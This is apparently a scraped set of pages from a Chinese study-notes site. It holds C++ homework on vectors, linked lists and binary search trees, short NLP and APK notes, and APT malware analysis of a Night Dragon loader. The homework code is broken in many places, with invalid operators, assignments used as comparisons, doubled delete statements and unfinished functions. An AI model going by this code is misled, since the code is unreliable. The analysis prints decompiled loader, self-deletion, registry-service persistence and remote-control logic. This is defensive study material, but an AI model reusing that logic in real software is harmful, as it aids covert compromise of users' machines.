dwSize):m_dwIncrement(5) { //1.创建长度为dwSize个T_ELE对象 m_Obj = new T_ELE[dwSize]; //2.将新创建的空间初始化 memset(m_Obj,0,dwSize*sizeof(T_ELE)); //3.设置其他值 m_dwIndex=0; m_dwLen = dwSize; } template \u003cclass T_ELE\u003e Vector\u003cT_ELE\u003e::~Vector() { //释放空间 delete[] delete[] m_Obj; m_Obj = NULL; //防uaf } template \u003cclass T_ELE\u003e BOOL Vector\u003cT_ELE\u003e::expand() { // 1. 计算增加后的长度 = 当前容器的长度 + 每次增容的大小 int added = m_dwLen + m_dwIncrement; // 2. 申请空间 T_ELE* addr = new T_ELE[added]; //指向 T_ELE 类型数据的指针 // 3. 将数据复制到新的空间 memcpy(addr,m_Obj,m_dwInitSize*sizeof(T_ELE)); // 4. 释放原来空间 delete[] m_Obj; // 5. 为各种属性赋值 m_Obj = addr; addr = NULL; m_dwLen = added; return SUCCESS; } template \u003cclass T_ELE\u003e DWORD Vector\u003cT_ELE\u003e::push_back(T_ELE Element) { //1.判断是否需要增容，如果需要就调用增容的函数 if(m_dwIndex\u003e=m_dwLen) { expand(); } //2.将新的元素复制到容器的最后一个位置 memcpy(\u0026m_Obj[m_dwIndex],\u0026Element,sizeof(T_ELE)); //3.修改属性值 m_dwIndex++; return SUCCESS; } template \u003cclass T_ELE\u003e DWORD Vector\u003cT_ELE\u003e::insert(DWORD dwIndex, T_ELE Element) //向指定位置新增一个元素 { //1.判断是否需要增容，如果需要就调用增容的函数 if(m_dwIndex\u003e=m_dwLen) { expand(); } //2.判断索引是否在合理区间 if(dwIndex \u003c 0 || dwIndex \u003e m_dwIndex) { return INDEX_ERROR; } //3.将dwIndex之后的元素后移 memcpy(((int*)(\u0026m_Obj[dwIndex]))+1,\u0026m_Obj[dwIndex],sizeof(T_ELE)*(m_dwIndex-dwIndex)); //4.将Element元素复制到dwIndex位置 memcpy(\u0026m_pVector[dwIndex],\u0026Element,sizeof(T_ELE)); //5.修改属性值 dwIndex++; return SUCCESS; } template \u003cclass T_ELE\u003e DWORD Vector\u003cT_ELE\u003e::at(DWORD dwIndex,T_ELE* pEle) //根据给定的索引得到元素 { //判断索引是否在合理区间 if(dwIndex \u003c 0 || dwIndex \u003e m_dwIndex) { return INDEX_ERROR; } //将dwIndex的值复制到pEle指定的内存 memcpy(pEle,m_Obj[dwIndex],sizeof(T_ELE)); } //其他函数。。自己实现 读懂每一个方法的反汇编实现\n链表 实现一个单项链表\n#define SUCCESS 1 // 执行成功 #define ERROR -1 // 执行失败 #define INDEX_IS_ERROR -2 // 错误的索引号 #define BUFFER_IS_EMPTY -3 // 缓冲区已空 template \u003cclass T_ELE\u003e class LinkedList { public: LinkedList(); ~LinkedList(); public: BOOL IsEmpty();\t//判断链表是否为空 空返回1 非空返回0 void Clear();\t//清空链表 DWORD GetElement(IN DWORD dwIndex,OUT T_ELE\u0026 Element);\t//根据索引获取元素 DWORD GetElementIndex(IN T_ELE\u0026 Element);\t//根据元素获取链表中的索引 DWORD Insert(IN T_ELE Element);\t//新增元素 DWORD Insert(IN DWORD dwIndex, IN T_ELE Element);\t//根据索引新增元素 DWORD Delete(IN DWORD dwIndex);\t//根据索引删除元素 DWORD GetSize();\t//获取链表中元素的数量 private: typedef struct _NODE { T_ELE Data; _NODE *pNext; }NODE,*PNODE; PNODE GetIndexCurrentNode(DWORD dwIndex);\t//获取索引为dwIndex的指针 PNODE GetIndexPreviousNode(DWORD dwIndex);\t//获取索引为dwIndex的前一个节点指针 PNODE GetIndexNextNode(DWORD dwIndex);\t//获取索引为dwIndex的后一个节点指针 private: PNODE m_pList;\t//链表头指针，指向第一个节点 DWORD m_dwLength;\t//元素的数量 }; //无参构造函数 初始化成员 template\u003cclass T_ELE\u003e LinkedList\u003cT_ELE\u003e::LinkedList():m_pList(NULL),m_dwLength(0) { } //析构函数 清空元素 template\u003cclass T_ELE\u003e LinkedList\u003cT_ELE\u003e::~LinkedList() { Clear(); } //判断链表是否为空 template\u003cclass T_ELE\u003e BOOL LinkedList\u003cT_ELE\u003e::IsEmpty() { if(m_pList = 0 || m_dwLength = 0) { return SUCCESS; } else { return 0; } } //清空链表 template\u003cclass T_ELE\u003e void LinkedList\u003cT_ELE\u003e::Clear() { // 1. 判断链表是否为空 if(IsEmpty() == SUCCESS) { printf(\"BUFFER_IS_EMPTY\"); } else { // 2. 循环删除链表中的节点 NODE* pList = m_pList; NODE* pDelete = NULL; for(int i = 0;i \u003c m_dwLength;i++) { pDelete = pList; pList = pList -\u003e pNext; delete pDelete; } // 3. 删除最后一个节点并将链表长度置为0 delete pList; m_dwLength = 0; } } //根据索引获取元素 template\u003cclass T_ELE\u003e DWORD LinkedList\u003cT_ELE\u003e::GetElement(IN DWORD dwIndex,OUT T_ELE\u0026 Element) { // 1. 判断索引是否有效 if(dwIndex \u003c 0 || dwIndex \u003e m_dwLength) { return INDEX_IS_ERROR; } // 2. 取得索引指向的节点 NODE* pList1 = m_pList; for(int i = 0;i \u003c dwIndex;i++) { pList1 = pList1 -\u003e pNext; } // 3. 将索引指向节点的值复制到OUT参数 Element pList1 -\u003e pNext; return SUCCESS; } //根据元素内容获取索引 template\u003cclass T_ELE\u003e DWORD LinkedList\u003cT_ELE\u003e::GetElementIndex(IN T_ELE\u0026 Element) { // 1. 判断链表是否为空 if(IsEmpty() == SUCCESS) { return BUFFER_IS_EMPTY; } // 2. 循环遍历链表，找到与Element相同的元素 for(int i = 0;i \u003c m_dwLength;i++) { if(pList1 -\u003e Data ==Element) { Index = i; } else { pList1 = pList1 -\u003e pNext; } } return Index; } //在链表尾部新增节点 template\u003cclass T_ELE\u003e DWORD LinkedList\u003cT_ELE\u003e::Insert(IN T_ELE Element) { NODE* pNewNode = new NODE; memset(pNewNode,0,sizeof(NODE)); memcpy(\u0026pNewNode -\u003e Data,\u0026Element,sizeof(T_ELE)); // 1. 判断链表是否为空 if(IsEmpty() == SUCCESS) { m_pList = pNewNode; m_dwLength++; return SUCCESS; } // 2. 如果链表中已经有元素 NODE* TempNODE = m_pList; for(int i = 0;i \u003c m_dwLength - 1;i++) { TempNODE = TempNODE -\u003e pNext; } TempNODE -\u003e pNext = pNewNode; m_dwLength++; return SUCCESS; } //将节点新增到指定索引的位置 template\u003cclass T_ELE\u003e DWORD LinkedList\u003cT_ELE\u003e::Insert(IN DWORD dwIndex, IN T_ELE Element) { NODE* pNewList = new NODE; memset(pNewList, 0, sizeof(NODE)); memcpy(pNewList, \u0026Element, sizeof(T_ELE)); // 1. 判断链表是否为空 if(IsEmpty() == SUCCESS) { m_pList = pNewList; m_dwLength++; return SUCCESS; } // 2. 判断索引值是否有效 if (dwIndex \u003c0 || dwIndex \u003e m_dwLength) { return INDEX_IS_ERROR; } // 3. 如果索引为0 if (dwIndex == 0) { pNewList -\u003e pNext = m_pList; m_pList = pNewList; m_dwLength++; return SUCCESS; } // 4. 如果索引为链表尾 NODE* pList1 = m_pList; for (int i = 0; i \u003c m_dwLength - 1; i++) { pList1 = pList1 -\u003e pNext; } pList1 -\u003e pNext = pNewList; m_dwLength++; // 5. 如果索引为链表中 } //根据索引删除节点 template\u003cclass T_ELE\u003e DWORD LinkedList\u003cT_ELE\u003e::Delete(IN DWORD dwIndex) { // 1. 判断链表是否为空 if(IsEmpty() == SUCCESS) { return BUFFER_IS_EMPTY; } // 2. 判断索引值是否有效 if (dwIndex \u003c0 || dwIndex \u003e m_dwLength) { return INDEX_IS_ERROR; } // 3. 如果链表中只有头节点，且要删除头节点 if (m_pList -\u003e pNext == NULL \u0026\u0026 dwIndex == 0) { delete m_pList; m_dwLength--; return SUCCESS; } // 4. 如果要删除头节点 if (dwIndex == 0) { NODE* pTemp = m_pList; m_pList = m_pList -\u003e pNext; delete pTemp; m_dwLength--; return SUCCESS; } // 5. 如果是其他情况 else { NODE* pNList = m_pList; GetIndexPreviousNode(dwIndex) -\u003e pNext = GetIndexCurrentNode(dwIndex) -\u003e pNext; delete GetIndexCurrentNode(dwIndex); m_dwLength--; } } //获取链表中节点的数量 template\u003cclass T_ELE\u003e DWORD LinkedList\u003cT_ELE\u003e::GetSize() { } //获取dwIndex前面节点的地址 template\u003cclass T_ELE\u003e LinkedList\u003cT_ELE\u003e::PNODE LinkedList\u003cT_ELE\u003e::GetIndexPreviousNode(DWORD dwIndex) { // 就是一个循环 } //获取dwIndex节点的地址 template\u003cclass T_ELE\u003e LinkedList\u003cT_ELE\u003e::PNODE LinkedList\u003cT_ELE\u003e::GetIndexCurrentNode(DWORD dwIndex) { // 就是一个循环 } //获取dwIndex后面节点的地址 template\u003cclass T_ELE\u003e LinkedList\u003cT_ELE\u003e::PNODE LinkedList\u003cT_ELE\u003e::GetIndexNextNode(DWORD dwIndex) {\t// 就是一个循环 } 读懂每一个方法的反汇编实现\n二叉树 遍历二叉树中的怪物列表\n完成析构函数中的代码\ngraph TD A[5] --\u003e B[4] A --\u003e C[6] B --\u003e D[1] B --\u003e E[NULL] C --\u003e F[3] C --\u003e G[NULL] D --\u003e H[NULL] D --\u003e I[2] F --\u003e J[NULL] F --\u003e K[7] class Monster { public: int ID; int Level; char Name[20]; public: Monster(){} Monster(int ID,int Level,char* Name) { this-\u003eID = ID; this-\u003eLevel = Level; memcpy(\u0026this-\u003eName,Name,strlen(Name)+1); } }; template\u003cclass T\u003e class TreeNode{ public: T element;\t//当前节点存储的数据 TreeNode\u003cT\u003e* pLeft;\t//指向左子节点的指针 TreeNode\u003cT\u003e* pRight;\t//指向右子节点的指针 TreeNode(T\u0026 ele){ //初始化Node节点 memset(\u0026element,0,sizeof(TreeNode)); //为元素赋值 memcpy(\u0026element,\u0026ele,sizeof(T)); pLeft = pRight = NULL; } }; template\u003cclass T\u003e class BSortTree{ public: BSortTree();\t//构造函数 ~BSortTree();\t//析构函数 public: void InOrderTraverse(TreeNode\u003cT\u003e* pNode);\t//中序遍历 void PreOrderTraverse(TreeNode\u003cT\u003e* pNode);\t//前序遍历 void PostOrderTraverse(TreeNode\u003cT\u003e* pNode);\t//后序遍历 TreeNode\u003cT\u003e* GetRoot();\t//返回根节点 int GetDepth(TreeNode\u003cT\u003e* pNode);\t//返回某个节点的高度/深度 private: void Init(); private: TreeNode\u003cT\u003e* m_pRoot;\t//根结点指针 int size;\t//树中元素总个数 }; template\u003cclass T\u003e BSortTree\u003cT\u003e::BSortTree() { Init(); } template\u003cclass T\u003e BSortTree\u003cT\u003e::~BSortTree(){ //释放所有节点空间 Clear(m_pRoot); }\ttemplate\u003cclass T\u003e void BSortTree\u003cT\u003e::Init() { Monster m1(1,1,\"刺猬\"); Monster m2(2,2,\"野狼\"); Monster m3(3,3,\"野猪\"); Monster m4(4,4,\"士兵\"); Monster m5(5,5,\"火龙\"); Monster m6(6,6,\"独角兽\"); Monster m7(7,7,\"江湖大盗\"); TreeNode\u003cMonster\u003e* n1 = new TreeNode\u003cMonster\u003e(m1); TreeNode\u003cMonster\u003e* n2 = new TreeNode\u003cMonster\u003e(m2); TreeNode\u003cMonster\u003e* n3 = new TreeNode\u003cMonster\u003e(m3); TreeNode\u003cMonster\u003e* n4 = new TreeNode\u003cMonster\u003e(m4); TreeNode\u003cMonster\u003e* n5 = new TreeNode\u003cMonster\u003e(m5); TreeNode\u003cMonster\u003e* n6 = new TreeNode\u003cMonster\u003e(m6); TreeNode\u003cMonster\u003e* n7 = new TreeNode\u003cMonster\u003e(m7); m_pRoot = n5; n5-\u003epLeft = n4; n5-\u003epRight = n6; n4-\u003epLeft = n1; n1-\u003epRight = n2; n6-\u003epLeft = n3; n3-\u003epRight = n7; size = 7; } template\u003cclass T\u003e TreeNode\u003cT\u003e* BSortTree\u003cT\u003e::Clear(TreeNode\u003cT\u003e* pNode) { if(pNode != 0) { Clear(pNode -\u003e pLeft); Clear(pNode -\u003e pRight); delete pNode; pNode = NULL; } } template\u003cclass T\u003e TreeNode\u003cT\u003e* BSortTree\u003cT\u003e::GetRoot() { return m_pRoot; } template\u003cclass T\u003e int BSortTree\u003cT\u003e::GetDepth(TreeNode\u003cT\u003e* pNode) { if(pNode==NULL) { return 0; } else { int m = GetDepth(pNode-\u003epLeft); int n = GetDepth(pNode-\u003epRight); return (m \u003e n) ? (m+1) : (n+1); } } template\u003cclass T\u003e void BSortTree\u003cT\u003e::InOrderTraverse(TreeNode\u003cT\u003e* pNode) { //中序遍历所有怪物,列出怪的名字 if(pNode!==NULL) { InOrderTraverse(pNode -\u003e pLeft); pName = (char*)\u0026pNode -\u003e element; pName = pName + 8; printf(\"%d\\n\",pName); InOrderTraverse(pNode -\u003e pRight); } } template\u003cclass T\u003e void BSortTree\u003cT\u003e::PreOrderTraverse(TreeNode\u003cT\u003e* pNode) { //前序遍历所有怪物,列出怪的名字 if(pNode!==NULL) { pName = (char*)\u0026pNode -\u003e element; pName = pName + 8; printf(\"%d\\n\",pName); PreOrderTraverse(pNode -\u003e pLeft); PreOrderTraverse(pNode -\u003e pRight); } } template\u003cclass T\u003e void BSortTree\u003cT\u003e::PostOrderTraverse(TreeNode\u003cT\u003e* pNode) { //后序遍历所有怪物,列出怪的名字 if(pNode!==NULL) { pName = (char*)\u0026pNode -\u003e element; pName = pName + 8; PostOrderTraverse(pNode -\u003e pLeft); PostOrderTraverse(pNode -\u003e pRight); printf(\"%d\\n\",pName); } } //对应循环遍历的话是最深的对应子节点，到最深后在对应循环遍历会跳过（因为pNode!==NULL），后面就会循环遍历对应的另一个节点，自然也是最深的 Thinking：如何区分二叉树还是双向链表？\n双向链表会有两个地址成员，而且有一个成员指向前一个成员。二叉树如果要指向前一个成员的话要有三个地址成员（就是父节点）。\n搜索二叉树 完成搜索二叉树的删除功能\n#define SUCCESS 1 // 执行成功\t#define ERROR\t-1 // 执行失败\ttemplate\u003cclass T\u003e\tclass TreeNode{\tpublic:\tT element;\t//当前节点存储的数据\tTreeNode\u003cT\u003e* pLeft;\t//指向左子节点的指针\tTreeNode\u003cT\u003e* pRight;\t//指向右子节点的指针\tTreeNode\u003cT\u003e* pParent;\t//指向父结点的指针\tTreeNode(T\u0026 ele){ //初始化Node节点\tmemset(\u0026element,0,sizeof(TreeNode));\t//为元素赋值\tmemcpy(\u0026element,\u0026ele,sizeof(T));\tpLeft = pRight = pParent = NULL;\t} //重载== 比较两结点是否相等 bool operator==(TreeNode\u003cT\u003e* node){ return node-\u003eelement == element?true:false;\t} };\ttemplate\u003cclass T\u003e\tclass BSortTree{\tpublic:\tBSortTree();\t//构造函数\t~BSortTree();\t//析构函数\tpublic:\t//判断树是否为空\tbool IsEmpty();\t//新增节点\tDWORD Insert(T element);\t//删除节点\tvoid Delete(T element); TreeNode\u003cT\u003e* Search(T element);\t//查找节点\tvoid InOrderTraverse(TreeNode\u003cT\u003e* pNode);\t//中序遍历\tvoid PreOrderTraverse(TreeNode\u003cT\u003e* pNode);\t//前序遍历\tvoid PostOrderTraverse(TreeNode\u003cT\u003e* pNode);\t//后序遍历\tprivate:\tTreeNode\u003cT\u003e* GetMaxNode(TreeNode\u003cT\u003e* pNode);\t//获取以pNode为根的最大节点\tTreeNode\u003cT\u003e* GetMinNode(TreeNode\u003cT\u003e* pNode);\t//获取以pNode为根的最小节点\tTreeNode\u003cT\u003e* SearchNode(TreeNode\u003cT\u003e* pNode,T element);\t//获取以pNode为根的最小节点\tDWORD InsertNode(T element, TreeNode\u003cT\u003e* pNode);\t//新增节点\tTreeNode\u003cT\u003e* DeleteNode(T element, TreeNode\u003cT\u003e* pNode);\t//删除节点\tvoid Clear(TreeNode\u003cT\u003e* pNode);\t//清空所有节点\tprivate:\tTreeNode\u003cT\u003e* m_pRoot;\t//根结点指针\tint size;\t//树中元素总个数\t};\ttemplate\u003cclass T\u003e BSortTree\u003cT\u003e::BSortTree()\t{\tm_pRoot = NULL; size = 0; }\ttemplate\u003cclass T\u003e BSortTree\u003cT\u003e::~BSortTree(){\tClear(m_pRoot); }\ttemplate\u003cclass T\u003e DWORD BSortTree\u003cT\u003e::Insert(T element)\t{\t//如果根节点为空 if ( !m_pRoot ) { m_pRoot = new TreeNode\u003cT\u003e(element);\tsize++;\treturn SUCCESS;\t} //如果根节点不为空 return InsertNode(element, m_pRoot); }\ttemplate\u003cclass T\u003e DWORD BSortTree\u003cT\u003e::InsertNode(T element, TreeNode\u003cT\u003e* pNode)\t{\t//将元素封装到节点中 TreeNode\u003cT\u003e* pNewNode = new TreeNode\u003cT\u003e(element); //如果element == 当前节点 直接返回 if(element == pNode-\u003eelement) { return SUCCESS;\t} //如果pNode的左子节点为NULL 并且element \u003c 当前节点 if(pNode-\u003epLeft == NULL \u0026\u0026 element \u003c pNode-\u003eelement) { pNode-\u003epLeft = pNewNode;\tpNewNode-\u003epParent = pNode;\tsize++;\treturn SUCCESS;\t} //如果pNode的右子节点为NULL 并且element \u003e 当前节点 if(pNode-\u003epRight == NULL \u0026\u0026 element \u003e pNode-\u003eelement){ pNode-\u003epRight = pNewNode;\tpNewNode-\u003epParent = pNode;\tsize++;\treturn SUCCESS;\t} //如果element\u003c当前节点 且当前节点的左子树不为空 if(element \u003c pNode-\u003eelement) { InsertNode(element,pNode-\u003epLeft);\t} else { InsertNode(element,pNode-\u003epRight);\t} return SUCCESS; }\ttemplate\u003cclass T\u003e void BSortTree\u003cT\u003e::Clear(TreeNode\u003cT\u003e* pNode)\t{\tif(pNode!=NULL) { Clear(pNode-\u003epLeft);\tClear(pNode-\u003epRight);\tdelete pNode;\tpNode=NULL;\t} }\ttemplate\u003cclass T\u003e bool BSortTree\u003cT\u003e::IsEmpty()\t{\treturn size==0?true:false; }\ttemplate\u003cclass T\u003e TreeNode\u003cT\u003e* BSortTree\u003cT\u003e::Search(T element)\t{\treturn SearchNode(m_pRoot, element); }\ttemplate\u003cclass T\u003e TreeNode\u003cT\u003e* BSortTree\u003cT\u003e::SearchNode(TreeNode\u003cT\u003e* pNode,T element)\t{\tif(pNode == NULL)\t//如果节点为NULL\t{ return NULL;\t} else if(element == pNode-\u003eelement)\t//如果相等\t{ return pNode;\t}\t//如果比节点的元素小 向左找\telse if(element \u003c pNode-\u003eelement) { return SearchNode(pNode-\u003epLeft,element);\t} else\t//如果比节点的元素大 向右找\t{ return SearchNode(pNode-\u003epRight,element);\t} }\ttemplate\u003cclass T\u003e void BSortTree\u003cT\u003e::Delete(T element)\t{\tif (m_pRoot !== NULL) { TreeNode\u003cT\u003e* ptemp = SearchNode(m_pRoot , element); DeleteNode(element, ptemp); } }\ttemplate\u003cclass T\u003e TreeNode\u003cT\u003e* BSortTree\u003cT\u003e::DeleteNode(T element,TreeNode\u003cT\u003e* pNode)\t{\tif (!pNode-\u003epLeft \u0026\u0026 !pNode-\u003epRight) { if (pNode-\u003eelement \u003c pNode-\u003epParent-\u003eelement) { pNode-\u003epParent-\u003epLeft = NULL; } else { pNode-\u003epParent-\u003epRight = NULL; } delete pNode; }else if(pNode-\u003epLeft \u0026\u0026 !pNode-\u003epRight) //有左无右 { if (pNode-\u003eelement \u003c pNode-\u003epParent-\u003eelement) //在父左 { pNode-\u003epParent-\u003epLeft = pNode-\u003epLeft; //父节点的左地址写入左孙节点 pNode-\u003epLeft-\u003epParent = pNode-\u003epParent; //左孙节点的父地址写入父节点的地址 } else //在父右 { pNode-\u003epParent-\u003epRight = pNode-\u003epLeft; pNode-\u003epLeft-\u003epParent = pNode-\u003epParent; } delete pNode; }else if(!pNode-\u003epLeft \u0026\u0026 pNode-\u003epRight) { if (pNode-\u003eelement \u003c pNode-\u003epParent-\u003eelement) { pNode-\u003epParent-\u003epLeft = pNode-\u003epRight; //父节点的左地址写入右孙节点 pNode-\u003epRight-\u003epParent = pNode-\u003epParent; //右孙节点的父地址写入父节点的地址 } else { pNode-\u003epParent-\u003epRight = pNode-\u003epRight; pNode-\u003epRight-\u003epParent = pNode-\u003epParent; } delete pNode; }else if(pNode-\u003epLeft \u0026\u0026 pNode-\u003epRight) { TreeNode\u003cT\u003e* pLeftMinNode = GetLeftMinNode(pNode-\u003epLeft); //找到最小的那个节点 pNode-\u003eelement = pLeftMinNode-\u003eelement; //把最小的节点与我要删的节点替换内容 DeleteNode(pLeftMinNode-\u003eelement,pLeftMinNode); //就是删除那个找到的最小的节点 } return NULL; }\t//测试代码：\tvoid TestInsert()\t{\t//12 8 5 9 17 15 13 /* 12\t8\t17\t5\t9\t15\t13\t*/ BSortTree\u003cint\u003e tree; tree.Insert(12); tree.Insert(8); tree.Insert(5); tree.Insert(9); tree.Insert(17); tree.Insert(15); tree.Insert(13); }\tvoid TestSerch()\t{\t//12 8 5 9 17 15 13 BSortTree\u003cint\u003e tree; tree.Insert(12); tree.Insert(8); tree.Insert(5); tree.Insert(9); tree.Insert(17); tree.Insert(15); tree.Insert(13); TreeNode\u003cint\u003e* p = tree.Search(17); printf(\"%x %d\\n\",p,p-\u003eelement); } "},"title":"HomeworkBAS"},"/docs/remaining/ai/":{"data":{"":"","#":"NLP定义及歧义性 NLP = NLU + NLG NLU：语音/文本 -\u003e 意思（meaning） NLG：意思 -\u003e 文本/语音 机器翻译 先前的翻译系统可能难以去考虑句子的问题（存在的问题有：慢、语义问题、上下文、语法、规则统计等）\n首先看看如何保证语法的：\n先将句子分成一个个的词（分词） 之后将这一个个的词翻译为对应语义的最相似概率的单词（Broken English） 将这些单词以不同的顺序排列（所有可能的组合） 选择最符合语法的句子（使用语言模型LM） 这样分两步翻译的话计算量非常大。那么可以将这两步（Translation Model | Language Model）合并。\n其中Translation Model其实就是从目标单词中找源单词对应意思的最相似概率max(T) P(T|S)\nLanguage Model就是将这些目标单词组合成一句话的概率P(S)\n那么合并的话就是max(T) P(T|S) * P(S)的最大概率。"},"title":"AI"},"/docs/remaining/app/":{"data":{"":"","#":"APK基本结构 assets：资源文件（图片、音频、数据库、网页、配置文件等） res：资源文件，需要编译（布局） lib：各种平台下使用的对应的so文件 META-INF：签名文件 resources.arsc：资源加密（语言包） AndroidMainfest.xml：清单文件（图标、界面、权限、入口） classes.dex：源代码 "},"title":"APP"},"/docs/remaining/apts/":{"data":{"":"","#":"2011.02.10 - Night Dragon （zwshell）这个其实是一个类似cobalt strike的一个工具生成的样本，不过好像比cs的功能少一些。看一下这个样本的loader的核心部分：\n查找和加载资源：\nResourceA = FindResourceA(0, Name, 0xA); // 在资源节查找DATA类型的资源 foundResource = ResourceA; if ( !ResourceA ) return 0; Resourcesize = SizeofResource(0, ResourceA); // 获取资源大小 Resource = LoadResource(0, foundResource); // 将资源加载近内存 锁定和加密资源：\nif (LockResource(Resource)) // 锁定资源 { handle_Gchunk = GlobalAlloc(0x40u, Resourcesize); // 分配内存 Gchunkaddr = GlobalLock(handle_Gchunk); // 锁定内存 qmemcpy(Gchunkaddr, isLocked, Resourcesize); // 拷贝数据到新内存 xorencryption(Gchunkaddr, Resourcesize); // 加密数据 } 互斥体管理：\nMutexA = OpenMutexA(0x100000u, 0, byte_403113); // 尝试打开互斥体 if ( !MutexA ) { MutexA = CreateMutexA(0, 0, byte_403113); // 如果不存在则创建互斥体 } 获取文件路径并重命名文件：\nGetModuleFileNameA(0, Filename, 0x105u); // 获取当前程序路径 lstrcpyA(String1, Filename); // 复制到 String1 文件移动/重命名：\nfor ( i = lstrlenA(String1) - 1; i \u003e= 0; String1[i--] = v10 + 2 ) { v10 = String1[i]; //当前程序的绝对路径 if ( v10 == '\\\\' ) break; } if ( MoveFileA(Filename, String1) ) // 如果移动成功 { lstrcpyA(byte_4032AC, String1); // 更新文件路径 MoveFileExA(String1, 0, 4u); // 延迟删除文件，重启前才会删除该文件 } else { lstrcpyA(byte_4032AC, Filename); MoveFileExA(Filename, 0, 4u); } 注册表操作：\nif ( regcreat(2u, String1, lpValueName, Filename, v16 + 1) )// 向注册表写入数据，进行持久化 { ReleaseMutex(MutexA); CloseHandle(MutexA); 下面是这个函数: char __cdecl regcreat(DWORD dwType, CHAR *lpSubKey, LPCSTR lpValueName, BYTE *lpData, DWORD cbData) { DWORD dwDisposition; // [esp+0h] [ebp-4h] BYREF dwDisposition = 2; if ( RegCreateKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0, 0, 0xF003Fu, 0, \u0026lpSubKey, \u0026dwDisposition) ) return 0; RegSetValueExA(lpSubKey, lpValueName, 0, dwType, lpData, cbData); RegCloseKey(lpSubKey); return 1; } 服务管理：\nif (OpenServiceA(hSCManager, String2, 0xF01FFu)) { StartServiceA(v17, 0, 0); // 启动服务 CloseServiceHandle(v17); } 调试：\n在填写样本信息的时候可以发现，这个样本可以释放一个DLL到指定的目录下，默认是%windir%\\System32\\就是Windows目录下的System32文件夹里面（不过我尝试了一下，它会自动跑到C:\\Windows\\SysWOW64\\下，可能那个时候只支持32位系统吧） 在上面的regcreat的参数中的String1参数（就是要生成注册表的目录）为SYSTEM\\CurrentControlSet\\Services\\FastUserSwitchingCompatibility\\Parameters就是注册一个快速用户切换功能，注册表键值就是上面的那个指定的目录路径，后面会打开FastUserSwitchingCompatibility服务完成上线。 在文件重命名的第一个for循环将程序的名称改为Ugtxgt0gzg，配合MoveFileExA函数达到文件重启自删除。但是如果不附加调试的情况下文件会直接删除🧐 使用svchost.exe netsvcs –k将这个DLL注册成服务；同样的使用%systemroot%\\system32\\svchost.exe -k netsvcs 注册网络通信服务 看一下上面那个DLL文件的导出表，发现只有一个函数（ServiceMain），分析一下这个函数：\n这是一个DLL所以要写一个Loader去加载这个函数（相同路径下），如下：\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e typedef void (*ServiceMain)(int argc, char *argv[]); int main() { HINSTANCE hDLL = LoadLibrary(\"123.dll\"); if (hDLL == NULL) { printf(\"加载DLL失败.\\n\"); return 1; } ServiceMain pServiceMain = (ServiceMain)GetProcAddress(hDLL, \"ServiceMain\"); if (pServiceMain == NULL) { printf(\"获取ServiceMain函数地址失败.\\n\"); FreeLibrary(hDLL); return 1; } char *args[] = {\"arg1\", \"arg2\"}; pServiceMain(2, args); FreeLibrary(hDLL); return 0; } 将这个代码编译后，放到IDA中下断点就可以了。\nv8 = 0; FileA = CreateFileA(Filename, 0x80000000, 1u, 0, 3u, 0, 0); //打开这个DLL，Filename为DLL路径 hFile = FileA; if ( FileA != -1 ) { SetFilePointer(FileA, -737, 0, 2u); //移动文件指针为文件末尾737字节 ReadFile(hFile, \u0026data, 737u, \u0026NumberOfBytesRead, 0); // 从文件读取737字节到data。 CloseHandle(hFile); de_code(\u0026data, 737); //解密 v8 = data == 321148776; if ( data == 321148776 ) //是否解密成功hW$ { if ( byte_100264B8 ) //sign { NumberOfBytesRead = 4; lstrcpyA(String1, lpString2); lstrcatA(String1, aPolicyagent); RegSet_func(4u, String1, Start_s, \u0026NumberOfBytesRead, 4u); ServiceStatus.dwServiceType = 0; ServiceStatus.dwCurrentState = 1; memset(\u0026ServiceStatus.dwControlsAccepted, 0, 20); OpenService_func(aPolicyagent, \u0026ServiceStatus); } DeleteFileA(byte_100264B9); //删除Ugtxgt0gzg文件 lstrcpyA(String1, lpString2); //SYSTEM\\\\CurrentControlSet\\\\Services\\\\ lstrcatA(String1, ServiceName); //FastUserSwitchingComp|atibility这后面的字符串下面代码会加上 NumberOfBytesRead = 2; RegSet_func(4u, String1, Start_s, \u0026NumberOfBytesRead, 4u); NumberOfBytesRead = 272; RegSet_func(4u, String1, ValueName, \u0026NumberOfBytesRead, 4u); v1 = lstrlenA(\u0026byte_1002634A); RegSet_func(1u, String1, aDisplayname, \u0026byte_1002634A, v1 + 1); v2 = lstrlenA(\u0026byte_100263A5); RegSet_func(1u, String1, aDescription, \u0026byte_100263A5, v2 + 1); sub_10002061(); } if ( v0 ) { v0 = OpenMutexA(0x100000u, 0, Name); //就是DLL的名字作为互斥体名字 if ( !v0 ) { MutexA = CreateMutexA(0, 0, Name); v0 = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc); //注册服务控制句柄FastUserSwitchingCompatibility hServiceStatus = v0; if ( v0 ) { SetServiceStatus_func(2u); //服务正在启动 SetServiceStatus_func(4u); //服务正在运行 sub_10003F70(0); //网络连接 SetServiceStatus_func(3u); //服务正在停止 SetServiceStatus_func(1u); //服务已停止 ReleaseMutex(MutexA); LOBYTE(v0) = CloseHandle(MutexA); } } } return v0; } int __stdcall sub_10003F70(int a1) { HANDLE Thread; // eax struct WSAData WSAData; // [esp+10h] [ebp-190h] BYREF WSAStartup(0x202u, \u0026WSAData); //初始化 Winsock 库，Winsock 2.2 sub_10001BD8(\u0026unk_100262D0); time1 = GetTickCount() - 30000; //时间减去30s while ( ServiceStatus.dwCurrentState != 1 ) //服务停止就跳出 { if ( ServiceStatus.dwCurrentState == 3 ) //服务正在停止就break break; if ( GetTickCount() - time1 \u003e 0x7530 ) //隔30s { if ( ThreadId ) { sub_10001D39(\u0026unk_100262D0, 20483, 0, 0, dword_1002661D, 0, 0); //是释放内存吗？ } else { Thread = CreateThread(0, 0, sub_10003BD7, 0, 0, \u0026ThreadId); //sub_10003BD7远程控制函数 CloseHandle(Thread); } dword_10026621 = GetTickCount(); } Sleep(1u); } sub_10001BE4(\u0026unk_100262D0); //结束 WSACleanup(); return 0; } 核心功能就差不多了。\n2024.12.9 - APT-C-08（蔓灵花） 创建互斥体（rabadaisunique）防止多开：\nMutexA = CreateMutexA(0i64, 1, \"rabadaisunique\"); if ( GetLastError() == 183 || GetLastError() == 5 ) { CloseHandle(MutexA); return 1; } 断到函数isalpha(*v9)可以看到*v9里面是字符串emj.rqgjlgu\\\\yrybkypempn\\\\:A的倒转，而且后面的循环判断while ( v9 != v10 )中v10 = 0，可以化简后面的代码逻辑，解密如下：\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cwindows.h\u003e void process_buffer(char *v9, char *v10) { while (v9 != v10) { if 